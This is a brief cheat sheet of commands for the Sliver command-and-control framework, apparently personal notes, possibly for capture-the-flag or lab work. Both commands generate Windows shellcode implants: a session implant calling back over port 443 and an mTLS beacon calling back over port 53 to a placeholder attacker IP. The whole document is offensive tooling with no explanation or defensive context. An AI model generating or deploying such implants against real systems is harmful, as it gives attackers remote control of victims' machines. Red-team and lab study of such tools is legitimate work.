# sliver c2
#UTILS


## Generate a Session 
```
generate -m <ip>:443 -G -l -f shellcode --os windows -s /opt/CTFPacker/Linux
```


## Generate a Beacon 
```
generate beacon --mtls <ip>:53 --os windows --arch amd64 --format shellcode --save /opt/sliver/pain.raw
```